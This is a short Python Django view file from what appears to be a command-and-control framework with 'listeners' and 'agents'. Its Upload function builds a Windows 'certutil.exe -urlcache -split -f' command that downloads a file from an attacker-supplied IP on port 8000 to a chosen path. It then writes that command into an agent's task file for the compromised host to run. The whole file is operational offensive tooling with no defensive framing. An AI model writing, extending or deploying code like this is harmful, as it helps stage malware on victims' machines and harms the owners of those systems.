import os
from blog.views import *
from blog.models import *

#HERE I MEAN UPLOAD FILE TO AGENT => AGENT WILL DOWNLOAD

current_path= os.path.dirname(os.path.abspath(__file__))

def Upload(request, agent='',ip='',file_path='', destination=''):
    if request.method=='POST':
        task = 'certutil.exe -urlcache -split -f http://{}:8000/{} {}'.format(ip,file_path,destination)
        task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
        with open(task_path, "w") as f:
            f.write(task)
            f.close()
    else:
        return render(request, 'blog/listeners.html')
